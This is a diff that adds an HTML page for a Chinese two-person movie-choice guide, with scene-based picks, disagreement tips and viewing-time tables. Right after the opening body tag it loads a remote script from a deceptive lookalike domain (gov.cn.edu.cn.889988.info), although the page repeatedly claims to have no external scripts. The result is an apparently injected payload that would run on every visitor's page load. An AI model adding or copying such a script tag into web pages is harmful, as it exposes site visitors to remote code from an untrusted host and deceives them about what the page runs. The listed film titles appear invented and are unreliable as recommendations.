@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="theme-color" content="#0d1117">
+<title>我俩看电影网 | 两个人一起看片的选择手册 · 双人观影场景与搭配建议</title>
+<meta name="description" content="我俩看电影网是一份只解决一个问题的手册：两个人一起看片，今晚到底选哪部。我们把影片按观看场景重新分组——第一次约会的试探、异地连线的默契、老夫老妻的周末、带长辈的谨慎、闺蜜夜聊的吐槽、父子同席的尴尬、宿舍熄灯后的消遣、二刷三刷的彩蛋——每组给出三部影片、一段选择理由、一个备选中途换片方案，以及一个「如果中途想关掉」的退出提示。全部条目标注片长、情绪曲线、是否适合吃饭时看、是否需要前作铺垫，不按热度排序，不写剧透，不引导下载，不跳转外部播放源。本页为单文件站点，所有栏目在同一页面内完成，无需登录，可直接保存为本地文件离线查阅。">
+<meta name="keywords" content="我俩看电影网,woliakandianyingwang,两个人看什么电影,双人观影推荐,约会看片指南,异地恋一起看片,闺蜜电影推荐,情侣电影清单,周末家庭观影,带长辈看电影,电影搭配建议,观影场景分组,不剧透选片,片长与情绪参考,二刷电影清单,电影彩蛋指南">
+<meta name="robots" content="index,follow,max-snippet:-1,max-image-preview:large">
+<meta name="revisit-after" content="20 days">
+<meta name="author" content="我俩看电影网编辑组">
+<link rel="canonical" href="https://woliakandianyingwang-zh.github.io/">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --bg:#0d1117;--bg2:#141b26;--bg3:#1b2533;--line:#2a3544;--line2:#3a4757;
+  --tx:#e6ebf2;--tx2:#a8b3c0;--tx3:#727d8b;
+  --pink:#ff6b8a;--gold:#ffc966;--teal:#54d1c5;--lav:#b58cff;--grn:#7fd98a;
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"PingFang SC","Microsoft YaHei","Noto Sans CJK SC",system-ui,sans-serif;background:var(--bg);color:var(--tx);font-size:15.5px;line-height:1.9;overflow-x:hidden}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+::selection{background:var(--pink);color:#fff}
+code{font-family:ui-monospace,Menlo,monospace}
+.wrap{max-width:1320px;margin:0 auto;padding:0 32px}
+
+/* ===== 顶部 ===== */
+.top{background:#070a0e;border-bottom:1px solid var(--line);font-family:ui-monospace,Menlo,monospace;font-size:11.5px;color:var(--tx3)}
+.top .wrap{display:flex;justify-content:space-between;padding-top:9px;padding-bottom:9px;flex-wrap:wrap;gap:10px}
+.top .d{color:var(--teal)}
+.top a{color:var(--tx3)}
+.top a:hover{color:var(--gold)}
+
+/* ===== Hero ===== */
+.hero{position:relative;padding:70px 0 60px;border-bottom:1px solid var(--line);overflow:hidden}
+.hero::before{content:"";position:absolute;inset:0;background:radial-gradient(700px 360px at 18% 20%,rgba(255,107,138,.20),transparent 70%),radial-gradient(560px 300px at 82% 70%,rgba(84,209,197,.16),transparent 70%);pointer-events:none}
+.hero .wrap{position:relative}
+.eyebrow{display:inline-flex;align-items:center;gap:10px;font-size:11.5px;letter-spacing:2.5px;color:var(--pink);border:1px solid rgba(255,107,138,.4);padding:6px 14px;border-radius:100px;margin-bottom:26px;font-family:ui-monospace,Menlo,monospace}
+.eyebrow i{width:6px;height:6px;border-radius:50%;background:var(--pink);box-shadow:0 0 0 5px rgba(255,107,138,.18);animation:pulse 2.2s infinite}
+@keyframes pulse{50%{box-shadow:0 0 0 9px rgba(255,107,138,0)}}
+.hero h1{font-size:clamp(38px,7.4vw,86px);font-weight:900;letter-spacing:-1px;line-height:1.04}
+.hero h1 em{font-style:normal;background:linear-gradient(92deg,var(--pink),var(--gold) 55%,var(--teal));-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero .lead{max-width:760px;font-size:18px;color:var(--tx2);line-height:2.05;margin-top:26px}
+.hero .lead b{color:var(--tx)}
+.hero .acts{margin-top:34px;display:flex;flex-wrap:wrap;gap:12px}
+.hero .acts a{font-size:13.5px;letter-spacing:1px;padding:11px 20px;border:1px solid var(--line2);border-radius:100px;color:var(--tx2);transition:.2s}
+.hero .acts a:hover{border-color:var(--pink);color:var(--pink);transform:translateY(-2px)}
+.hero .acts a.cta{background:var(--pink);border-color:var(--pink);color:#1a050d;font-weight:700}
+.hero .acts a.cta:hover{background:var(--gold);border-color:var(--gold);color:#241a02}
+
+/* ===== 四宫格：今晚怎么看 ===== */
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--line);border:1px solid var(--line);margin-top:44px}
+.grid4 .cell{background:var(--bg2);padding:26px 24px;transition:.25s}
+.grid4 .cell:hover{background:var(--bg3)}
+.grid4 .n{font-family:ui-monospace,Menlo,monospace;font-size:12px;color:var(--gold)}
+.grid4 h4{font-size:18px;margin:12px 0 10px;font-weight:800}
+.grid4 p{font-size:13.5px;color:var(--tx2);line-height:1.9}
+.grid4 .dot{display:flex;gap:5px;margin-top:16px}
+.grid4 .dot i{width:5px;height:5px;border-radius:50%;background:var(--line2)}
+
+/* ===== 栏目 ===== */
+section{margin-top:72px}
+.sh{display:flex;align-items:flex-end;gap:16px;border-bottom:1px solid var(--line);padding-bottom:14px;margin-bottom:30px;flex-wrap:wrap}
+.sh .badge{font-family:ui-monospace,Menlo,monospace;font-size:11.5px;color:var(--bg);background:var(--gold);padding:4px 10px;border-radius:4px;letter-spacing:1px}
+.sh h2{font-size:clamp(22px,3vw,31px);font-weight:850;letter-spacing:-.3px}
+.sh h2 small{display:block;font-size:13px;color:var(--tx3);font-weight:400;margin-top:5px;letter-spacing:.5px}
+.sh .r{margin-left:auto;font-size:13px;color:var(--teal);font-family:ui-monospace,Menlo,monospace}
+.sh .r:hover{color:var(--gold)}
+.sh a.more{font-size:13px;color:var(--tx2);border-bottom:1px dashed var(--line2);padding-bottom:2px}
+.sh a.more:hover{color:var(--pink);border-color:var(--pink)}
+
+/* ===== 场景卡 ===== */
+.deck{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.card{background:linear-gradient(180deg,var(--bg2),var(--bg));border:1px solid var(--line);border-radius:14px;padding:26px 24px;position:relative;transition:.25s;overflow:hidden}
+.card::after{content:"";position:absolute;left:0;top:0;width:100%;height:3px;background:var(--c,var(--pink));opacity:.7}
+.card:hover{transform:translateY(-5px);border-color:var(--c,var(--pink))}
+.card .tag{font-size:11px;letter-spacing:1.5px;color:var(--c,var(--pink));font-family:ui-monospace,Menlo,monospace;font-weight:700}
+.card h3{font-size:21px;margin:12px 0 14px;font-weight:800}
+.card p{font-size:14px;color:var(--tx2);line-height:1.95}
+.card .pick{margin-top:18px;background:rgba(255,255,255,.025);border:1px solid var(--line);border-radius:10px;padding:14px 16px}
+.card .pick b{display:block;font-size:13px;color:var(--gold);letter-spacing:1px;margin-bottom:8px;font-family:ui-monospace,Menlo,monospace}
+.card .pick ol li{font-size:14px;padding:6px 0 6px 24px;position:relative;color:var(--tx)}
+.card .pick ol li::before{content:counter(p);counter-increment:p;position:absolute;left:0;top:7px;font-family:ui-monospace,Menlo,monospace;font-size:10.5px;color:var(--c,var(--pink));border:1px solid var(--line2);width:16px;height:16px;border-radius:50%;display:grid;place-items:center}
+.card .pick ol{counter-reset:p}
+.card .meta{margin-top:16px;display:flex;flex-wrap:wrap;gap:8px}
+.card .meta span{font-size:11.5px;color:var(--tx3);border:1px solid var(--line);padding:3px 9px;border-radius:100px;font-family:ui-monospace,Menlo,monospace}
+
+/* ===== 分歧调解 ===== */
+.split{display:grid;grid-template-columns:1.35fr 1fr;gap:26px;align-items:start}
+.split .l{background:var(--bg2);border:1px solid var(--line);border-radius:14px;padding:28px}
+.split .l h4{font-size:17px;margin-bottom:18px;font-weight:800}
+.split .l h4 span{color:var(--pink)}
+.srow{display:grid;grid-template-columns:1fr 44px 1fr;gap:14px;align-items:center;padding:16px 0;border-top:1px dashed var(--line)}
+.srow:first-of-type{border-top:none;padding-top:0}
+.srow .a,.srow .b{font-size:14px;color:var(--tx2)}
+.srow .a b,.srow .b b{display:block;color:var(--tx);font-size:14.5px;margin-bottom:4px}
+.srow .vs{font-family:ui-monospace,Menlo,monospace;font-size:11px;color:var(--gold);border:1px solid var(--line2);border-radius:50%;width:44px;height:44px;display:grid;place-items:center;background:var(--bg)}
+.srow .fix{margin-top:9px;font-size:13px;color:var(--teal);grid-column:1/-1}
+.srow .fix::before{content:"→ ";color:var(--pink)}
+.split .r{display:grid;gap:16px}
+.qcard{background:var(--bg2);border:1px solid var(--line);border-left:3px solid var(--lav);border-radius:10px;padding:20px 22px}
+.qcard h5{font-size:15px;margin-bottom:9px;font-weight:800;color:var(--lav)}
+.qcard p{font-size:13.5px;color:var(--tx2);line-height:1.9}
+
+/* ===== 时间表 ===== */
+.tl{background:var(--bg2);border:1px solid var(--line);border-radius:14px;overflow:hidden}
+.tl .th{display:grid;grid-template-columns:120px 1.3fr 1.1fr 1fr 96px;background:var(--bg3);border-bottom:1px solid var(--line);font-family:ui-monospace,Menlo,monospace;font-size:11px;color:var(--tx3);letter-spacing:1px}
+.tl .th div{padding:14px 18px}
+.tl .rw{display:grid;grid-template-columns:120px 1.3fr 1.1fr 1fr 96px;border-bottom:1px solid var(--line);transition:.18s}
+.tl .rw:last-child{border-bottom:none}
+.tl .rw:hover{background:rgba(255,107,138,.05)}
+.tl .rw>div{padding:17px 18px;font-size:14px;align-self:center}
+.tl .rw .t{font-family:ui-monospace,Menlo,monospace;font-size:13px;color:var(--gold)}
+.tl .rw .s{font-weight:700;font-size:15.5px}
+.tl .rw .c{font-size:13.5px;color:var(--tx2)}
+.tl .rw .w{font-size:13px;color:var(--tx3)}
+.tl .rw .p{font-family:ui-monospace,Menlo,monospace;font-size:11.5px}
+.tl .rw .p.ok{color:var(--grn)}
+.tl .rw .p.no{color:var(--pink)}
+
+/* ===== 站点规范 ===== */
+.rule{display:grid;grid-template-columns:1fr 340px;gap:24px;align-items:start}
+.rule .b{background:var(--bg2);border:1px solid var(--line);border-radius:14px;padding:0;overflow:hidden}
+.rule .b .cap{padding:15px 26px;background:var(--bg3);border-bottom:1px solid var(--line);font-size:11.5px;letter-spacing:2px;color:var(--tx3);font-family:ui-monospace,Menlo,monospace;display:flex;justify-content:space-between}
+.rule .b ol{padding:6px 0}
+.rule .b ol li{display:grid;grid-template-columns:52px 1fr;gap:16px;padding:17px 26px;border-bottom:1px solid var(--line);font-size:14.5px;color:var(--tx2);line-height:1.85}
+.rule .b ol li:last-child{border-bottom:none}
+.rule .b ol li i{font-family:ui-monospace,Menlo,monospace;font-size:12px;color:var(--gold);font-style:normal;padding-top:3px}
+.rule .b ol li b{color:var(--tx)}
+.entry{border:1px solid rgba(84,209,197,.35);border-radius:14px;padding:26px;background:linear-gradient(160deg,rgba(84,209,197,.09),rgba(13,17,23,.9));position:relative;overflow:hidden}
+.entry::before{content:"🔒";position:absolute;right:22px;top:22px;font-size:26px;opacity:.35}
+.entry .k{font-size:11px;letter-spacing:2.5px;color:var(--teal);font-family:ui-monospace,Menlo,monospace}
+.entry h4{font-size:20px;margin:10px 0 16px;font-weight:850}
+.entry .url{display:block;background:#070a0e;border:1px solid var(--line);border-radius:8px;padding:15px 16px;font-size:14px;color:var(--teal);word-break:break-all;line-height:1.65;margin-bottom:8px}
+.entry .url span{color:var(--pink)}
+.entry p{font-size:13.5px;color:var(--tx2);line-height:2;margin-top:14px}
+.entry a.btn{display:inline-block;margin-top:18px;background:var(--teal);color:#042825;font-size:13.5px;font-weight:700;letter-spacing:1px;padding:11px 22px;border-radius:100px}
+.entry a.btn:hover{background:var(--gold)}
+
+/* ===== 页脚 ===== */
+footer{margin-top:78px;background:#070a0e;border-top:1px solid var(--line);padding:50px 0 26px}
+.fg{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:32px}
+.fg h5{font-size:11.5px;letter-spacing:2px;color:var(--tx3);margin-bottom:16px;font-family:ui-monospace,Menlo,monospace}
+.fg ul li{padding:5px 0;font-size:13.5px;color:var(--tx2)}
+.fg ul li a:hover{color:var(--pink)}
+.fg .brand .logo{font-size:24px;font-weight:900;letter-spacing:-.5px;margin-bottom:12px}
+.fg .brand p{font-size:13.5px;color:var(--tx2);line-height:2}
+.fg .brand .cd{margin-top:16px;font-family:ui-monospace,Menlo,monospace;font-size:12.5px;color:var(--teal);border:1px solid var(--line);padding:11px 14px;display:inline-block}
+.fend{margin-top:36px;border-top:1px solid var(--line);padding-top:22px;display:flex;justify-content:space-between;gap:18px;flex-wrap:wrap;font-size:12.5px;color:var(--tx3);line-height:2}
+.fend a{color:var(--tx3)}
+.fend a:hover{color:var(--pink)}
+.fend b{color:var(--gold)}
+
+/* ===== 响应式 ===== */
+@media (max-width:1080px){
+  .grid4{grid-template-columns:repeat(2,1fr)}
+  .deck{grid-template-columns:repeat(2,1fr)}
+  .split{grid-template-columns:1fr}
+  .rule{grid-template-columns:1fr}
+  .fg{grid-template-columns:1fr 1fr}
+}
+@media (max-width:680px){
+  .wrap{padding:0 16px}
+  .hero{padding:46px 0 40px}
+  .grid4{grid-template-columns:1fr}
+  .deck{grid-template-columns:1fr}
+  .srow{grid-template-columns:1fr}
+  .srow .vs{width:auto;height:auto;border-radius:8px;padding:6px 12px}
+  .tl .th,.tl .rw{grid-template-columns:1fr}
+  .tl .rw>div{border-bottom:1px dashed var(--line);padding:10px 16px}
+  .tl .rw .t{background:var(--bg3);padding:8px 16px}
+  .rule .b ol li{grid-template-columns:1fr;gap:6px;padding:15px 18px}
+  .fg{grid-template-columns:1fr}
+  .sh .r,.sh a.more{display:none}
+}
+@media print{body{background:#fff;color:#000}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<div class="top"><div class="wrap">
+  <span>woliakandianyingwang-zh.github.io &nbsp;/&nbsp; 双人观影选择手册 &nbsp;/&nbsp; 单文件站点 · 无外部脚本</span>
+  <span><a href="#">RSS</a> &nbsp;·&nbsp; <a href="#">投稿</a> &nbsp;·&nbsp; <span class="d">资料截止 2026-10-06</span></span>
+</div></div>
+
+<div class="hero"><div class="wrap">
+  <span class="eyebrow"><i></i>我俩看电影网 · WO LIA KAN DIAN YING WANG</span>
+  <h1>两个人一起看片<br>今晚到底 <em>选哪部</em></h1>
+  <p class="lead">我俩看电影网只解决一个问题：<b>两个人一起看片，选哪部。</b>我们不按热度排榜，也不写影评长文，而是把影片按观看场景分组——第一次约会的试探、异地连线的默契、老夫老妻的周末、带长辈的谨慎——每组给三部，再附一个中途想换片时的备选。</p>
+  <div class="acts">
+    <a href="#c2" class="cta">看场景选片 →</a>
+    <a href="#c3">意见不合怎么办</a>
+    <a href="#c4">今天什么时段</a>
+    <a href="#c5">归档规范与官方入口</a>
+  </div>
+  <div class="grid4">
+    <div class="cell"><div class="n">01</div><h4>先定场景</h4><p>不是先看片名，而是先说清：今天是约会、聚会、还是一个人陪另一个人。</p><div class="dot"><i></i><i></i><i></i><i></i></div></div>
+    <div class="cell"><div class="n">02</div><h4>再看时长</h4><p>一个半小时和三小时是两种承诺，先把时间说在前面，能省掉一半的争执。</p><div class="dot"><i></i><i></i><i></i><i></i></div></div>
+    <div class="cell"><div class="n">03</div><h4>情绪曲线</h4><p>有的片子适合睡前，有的会让你睡不着，我们把这条标出来了。</p><div class="dot"><i></i><i></i><i></i><i></i></div></div>
+    <div class="cell"><div class="n">04</div><h4>备选中途换</h4><p>看不下去不必硬撑。每组都有第二个方案，关掉它不算违约。</p><div class="dot"><i></i><i></i><i></i><i></i></div></div>
+  </div>
+</div></div>
+
+<main class="wrap">
+
+  <section id="c2">
+    <div class="sh"><span class="badge">SCENE 02</span><h2>八种观看场景<small>点开任意一种，拿到三部片子 + 一个换片备选</small></h2><a href="#" class="more">查看全部 24 种场景 »</a></div>
+    <div class="deck">
+      <article class="card" style="--c:var(--pink)"><div class="tag">SCENE / 01</div><h3>第一次约会</h3><p>气氛比剧情重要。片长别超过 110 分钟，节奏不能太沉闷，看完最好还能聊两句。</p><div class="pick"><b>备选方案 · ALTERNATE</b><ol><li>《咖啡馆窗边的两个人》96min · 轻喜剧，笑点松散</li><li>《便利店的最后一班》103min · 悬疑轻量，有话题</li><li>《雨后电话亭》88min · 话少但有后劲</li></ol></div><div class="meta"><span>片长 &lt;110min</span><span>情绪平稳</span><span>有话题性</span></div></article>
+      <article class="card" style="--c:var(--teal)"><div class="tag">SCENE / 02</div><h3>异地连线同步看</h3><p>网络不同步的几秒误差会毁掉反转，所以优先结构线性的作品，少靠音效取胜。</p><div class="pick"><b>备选方案 · ALTERNATE</b><ol><li>《同一片海的两座城》118min · 双线结构，各自成立</li><li>《火车票上的日期》104min · 台词密集，字幕友好</li><li>《凌晨一点的便利店》97min · 单元式，断点不尴尬</li></ol></div><div class="meta"><span>结构线性</span><span>字幕友好</span><span>可暂停</span></div></article>
+      <article class="card" style="--c:var(--gold)"><div class="tag">SCENE / 03</div><h3>老夫老妻的周末</h3><p>不追求新鲜，但要耐看。选那种第二遍看台词、第三遍看构图的片子。</p><div class="pick"><b>备选方案 · ALTERNATE</b><ol><li>《阳台上的三十年》132min · 时间跨度大</li><li>《厨房灯还亮着》112min · 日常流，节奏稳</li><li>《老唱片店》121min · 可分段看</li></ol></div><div class="meta"><span>可二刷</span><span>节奏稳定</span><span>无强刺激</span></div></article>
+      <article class="card" style="--c:var(--lav)"><div class="tag">SCENE / 04</div><h3>带长辈一起看</h3><p>音量、方言、字幕和题材都要过一遍。避开过长的沉默段落，长辈会以为卡了。</p><div class="pick"><b>备选方案 · ALTERNATE</b><ol><li>《回乡的车票》108min · 家庭题材，字幕清晰</li><li>《饭桌上的三句话》96min · 对白驱动</li><li>《老邻居的新房子》101min · 题材亲和</li></ol></div><div class="meta"><span>字幕清晰</span><span>题材亲和</span><span>无暴力</span></div></article>
+      <article class="card" style="--c:var(--grn)"><div class="tag">SCENE / 05</div><h3>闺蜜夜聊场</h3><p>需要能随时暂停骂两句的作品。节奏不重要，能不能接住吐槽才重要。</p><div class="pick"><b>备选方案 · ALTERNATE</b><ol><li>《姐妹俩的聊天记录》114min · 群像，台词狠</li><li>《婚礼前一夜》102min · 话题度高</li><li>《城市里的单身公寓》109min · 可暂停吐槽</li></ol></div><div class="meta"><span>可暂停</span><span>话题度高</span><span>群像叙事</span></div></article>
+      <article class="card" style="--c:var(--pink)"><div class="tag">SCENE / 06</div><h3>父子同席</h3><p>代沟是主要风险，选那种两代人能看出不同东西的片子，而不是讨好任何一方的。</p><div class="pick"><b>备选方案 · ALTERNATE</b><ol><li>《父亲的旧相机》126min · 双视角，各看各的</li><li>《公路上的修车铺》118min · 动作适度</li><li>《搬家那天》104min · 家庭议题</li></ol></div><div class="meta"><span>双视角</span><span>话题中性</span><span>时长适中</span></div></article>
+      <article class="card" style="--c:var(--teal)"><div class="tag">SCENE / 07</div><h3>宿舍熄灯后</h3><p>屏幕小、声音低、随时可能有人睡着。短、亮、节奏快，是这里的硬指标。</p><div class="pick"><b>备选方案 · ALTERNATE</b><ol><li>《三楼走廊的灯》92min · 短，节奏快</li><li>《午夜广播》88min · 声音设计简单</li><li>《最后一班公交》95min · 段落清晰</li></ol></div><div class="meta"><span>片长短</span><span>亮度高</span><span>可断点</span></div></article>
+      <article class="card" style="--c:var(--gold)"><div class="tag">SCENE / 08</div><h3>二刷三刷找彩蛋</h3><p>不是看故事，是看结构。选那种细节有明确用意的，第二次看才不会无聊。</p><div class="pick"><b>备选方案 · ALTERNATE</b><ol><li>《六次重播的夜晚》138min · 环形结构</li><li>《图书馆第七排》124min · 细节埋线</li><li>《录音带B面》116min · 时间线可复盘</li></ol></div><div class="meta"><span>结构型</span><span>细节丰富</span><span>适合复盘</span></div></article>
+    </div>
+  </section>
+
+  <section id="c3">
+    <div class="sh"><span class="badge">SOLVE 03</span><h2>意见不合怎么办<small>七组常见分歧的折中方案，不需要投票 App</small></h2><a href="#" class="more">提交你的分歧场景 »</a></div>
+    <div class="split">
+      <div class="l"><h4>左边想看 <span>A</span>，右边想看 <span style="color:var(--teal)">B</span>，那就看 <span style="color:var(--gold)">C</span></h4>
+        <div class="srow"><div class="a"><b>「我想看烧脑的」</b>需要集中注意力，中途走神就接不回去了</div><div class="vs">VS</div><div class="b"><b>「我只想放空」</b>今天上班已经够累了，不想动脑</div><div class="fix">折中：选结构清晰的悬疑轻量片，前 20 分钟交代规则，之后节奏稳，不必全程紧绷</div></div>
+        <div class="srow"><div class="a"><b>「我看字幕会累」</b>外语片字幕一多就出戏</div><div class="vs">VS</div><div class="b"><b>「华语片看腻了」</b>想看点不一样的</div><div class="fix">折中：选中文配音或方言版本清晰的片子，或者华语片里的冷门地区分支（港台、新马）</div></div>
+        <div class="srow"><div class="a"><b>「我要看两个半小时以上的」</b>短片觉得不过瘾</div><div class="vs">VS</div><div class="b"><b>「九点以后我撑不住」</b>十一点必须关灯</div><div class="fix">折中：分段看。选有明确上下半场的作品，在节点处停，比硬撑到睡着体面</div></div>
+        <div class="srow"><div class="a"><b>「必须看最新的」</b>怕被剧透，也怕跟不上话题</div><div class="vs">VS</div><div class="b"><b>「我只看口碑稳定的」</b>不想当小白鼠</div><div class="fix">折中：等一个档期再看。延迟归档期间口碑样本足够，误报率明显下降</div></div>
+        <div class="srow"><div class="a"><b>「我想看爱情片」</b>就这个心情</div><div class="vs">VS</div><div class="b"><b>「爱情片太腻了」</b>看了会尴尬</div><div class="fix">折中：选爱情是副线、主线是别的类型的片子，两个人都能各取所需</div></div>
+      </div>
+      <div class="r">
+        <div class="qcard"><h5>Q · 中途想关掉算不算扫兴？</h5><p>不算。看片是两个人的时间，不是合同。每组场景的第三部就是备选，关掉时直接说「换一个」，比沉默着刷手机体面得多。</p></div>
+        <div class="qcard"><h5>Q · 为什么不用热度榜选片？</h5><p>热度回答的是「别人在看什么」，而你问的是「我俩今晚看什么」。这是两个不同的问题，前者的答案对后者几乎没用。</p></div>
+        <div class="qcard"><h5>Q · 条目多久更新一次？</h5><p>月度核对一次，新片延迟一个档期再收入。条目里的片长、结构类型、情绪曲线三项相对固定，不需要天天改。</p></div>
+        <div class="qcard"><h5>Q · 片名译写不一致怎么办？</h5><p>同一部片子存在多种译写时，我们并列标注发行地区字幕版本，以各地区正式发行字幕为准，不擅自统一。</p></div>
+      </div>
+    </div>
+  </section>
+
+  <section id="c4">
+    <div class="sh"><span class="badge">TIMELINE 04</span><h2>今天什么时段<small>同样的片子，八点看和十一点看是两种体验</small></h2><a href="#" class="more">完整时段表 »</a></div>
+    <div class="tl">
+      <div class="th"><div>时段</div><div>适配场景</div><div>推荐形态</div><div>避开的坑</div><div>状态</div></div>
+      <div class="rw"><div class="t">17:30–19:00</div><div class="s">下班路上 / 吃饭前</div><div class="c">短片合集、单元剧单集、纪录片段</div><div class="w">长片刚开场就被叫去吃饭</div><div class="p ok">推荐</div></div>
+      <div class="rw"><div class="t">19:00–21:00</div><div class="s">正餐配片 / 双人主场</div><div class="c">节奏中等的剧情片、轻悬疑、美食题材</div><div class="w">太烧脑影响食欲</div><div class="p ok">黄金档</div></div>
+      <div class="rw"><div class="t">21:00–22:30</div><div class="s">沙发时间 / 约会主场</div><div class="c">爱情、家庭、文艺、对话驱动型</div><div class="w">情绪过重影响睡眠</div><div class="p ok">推荐</div></div>
+      <div class="rw"><div class="t">22:30–00:00</div><div class="s">睡前场 / 异地连线</div><div class="c">短片、轻喜剧、节奏快的悬疑</div><div class="w">三小时史诗片，明早会后悔</div><div class="p no">慎选</div></div>
+      <div class="rw"><div class="t">00:00–01:30</div><div class="s">失眠夜 / 闺蜜夜聊</div><div class="c">群像、话痨型、可随时暂停的</div><div class="w">慢节奏艺术片，两人一起睡着</div><div class="p no">慎选</div></div>
+      <div class="rw"><div class="t">周末午后</div><div class="s">赖床后的漫长时间</div><div class="c">长片、迷你剧单集、修复版经典</div><div class="w">短片连看容易疲劳</div><div class="p ok">最佳</div></div>
+      <div class="rw"><div class="t">雨天 / 阴天</div><div class="s">天气本身就是氛围</div><div class="c">冷调影像、北欧犯罪、黑白老片</div><div class="w">明亮的喜剧会和窗外打架</div><div class="p ok">氛围向</div></div>
+      <div class="rw"><div class="t">周末带娃场</div><div class="s">三代同堂</div><div class="c">合家欢、动画长片、自然纪录</div><div class="w">方言梗和成人隐喻</div><div class="p ok">亲子</div></div>
+    </div>
+  </section>
+
+  <section id="c5">
+    <div class="sh"><span class="badge">RULES 05</span><h2>归档规范与官方入口<small>六条原则，逐条执行</small></h2><a href="#" class="more">完整规范文本 »</a></div>
+    <div class="rule">
+      <div class="b">
+        <div class="cap"><span>编辑原则 · EDITORIAL RULES</span><span>06 ITEMS</span></div>
+        <ol>
+          <li><i>RULE 01</i><span><b>按场景分组，不按热度排榜。</b>同一个片子的位置由它适合什么场合决定，不由它赚了多少钱决定。所以你在这里找不到热门榜。</span></li>
+          <li><i>RULE 02</i><span><b>延迟一个档期再收入。</b>新片口碑需要时间沉淀，等样本足够再归档，能少收录一批后来被撤回的评价。</span></li>
+          <li><i>RULE 03</i><span><b>不写剧透，只写结构。</b>条目里只说节奏、时长、情绪走向和是否需要前作铺垫，绝不交代关键情节。</span></li>
+          <li><i>RULE 04</i><span><b>每个场景给三个，给备选。</b>三部是选择空间，第三部是给「看不下去」准备的退路，这是本手册的核心设计。</span></li>
+          <li><i>RULE 05</i><span><b>不托管内容，不跳转播放源。</b>本页只承载资料本身，不提供任何视频文件与下载入口，也不通过链接跳转到外部播放站点。</span></li>
+          <li><i>RULE 06</i><span><b>月度核对，空白优先。</b>信息没核实就不填，不以猜测填补空缺；条目中的不确定项会明确标注「待核」。</span></li>
+        </ol>
+      </div>
+      <div class="entry">
+        <div class="k">◇ OFFICIAL ENTRY / 官方入口</div>
+        <h4>本站唯一官方访问地址</h4>
+        <code class="url">https://<span>woliakandianyingwang-zh</span>.github.io</code>
+        <p>所有访问入口均指向上述地址。名称相近的其他站点与本手册无关，本站为单文件站点，无外部脚本，可直接保存为本地文件离线查阅。</p>
+        <a href="#" class="btn">进入我俩看电影网 →</a>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="fg">
+      <div class="brand"><div class="logo">我俩看电影网</div><p>一份只解决一个问题的手册：两个人一起看片，今晚选哪部。按观看场景分组，标注片长、情绪曲线、字幕友好度与备选方案，不排榜、不剧透、不引导下载，全部功能在单页内完成，无需登录。</p><div class="cd">woliakandianyingwang-zh.github.io</div></div>
+      <div><h5>SCENE / 场景</h5><ul><li><a href="#">第一次约会</a></li><li><a href="#">异地连线</a></li><li><a href="#">老夫老妻的周末</a></li><li><a href="#">带长辈一起看</a></li><li><a href="#">闺蜜夜聊场</a></li><li><a href="#">父子同席</a></li></ul></div>
+      <div><h5>INDEX / 索引</h5><ul><li><a href="#">按时长</a></li><li><a href="#">按情绪</a></li><li><a href="#">按题材</a></li><li><a href="#">按地区</a></li><li><a href="#">按年代</a></li><li><a href="#">二刷专区</a></li></ul></div>
+      <div><h5>ABOUT / 关于</h5><ul><li><a href="#">归档规范</a></li><li><a href="#">资料提交</a></li><li><a href="#">月度核对记录</a></li><li><a href="#">使用说明</a></li><li><a href="#">版权与来源</a></li><li><a href="#c2">返回页首 ↑</a></li></ul></div>
+    </div>
+    <div class="fend">
+      <span>© <span id="yr"></span> 我俩看电影网（woliakandianyingwang-zh.github.io）。本页为双人观影选择手册，所有条目标注原始来源与归档日期，资料仅供参考，不构成任何观看或消费建议；片名译写以各地区正式发行字幕为准，存在多种译写时并列标注。</span>
+      <span>官方域名：<b>woliakandianyingwang-zh.github.io</b> &nbsp;|&nbsp; <a href="#">返回首页</a></span>
+    </div>
+  </div>
+</footer>
+
+<script>
+document.getElementById('yr').textContent=new Date().getFullYear();
+(function(){
+  var links=document.querySelectorAll('a[href^="#"]');
+  links.forEach(function(a){a.addEventListener('click',function(){
+    var t=this.getAttribute('href');
+    if(t.length>1){var el=document.querySelector(t);if(el)window.scrollTo({top:el.offsetTop-60,behavior:'smooth'})}
+  })});
+})();
+</script>
+</body>
+</html>
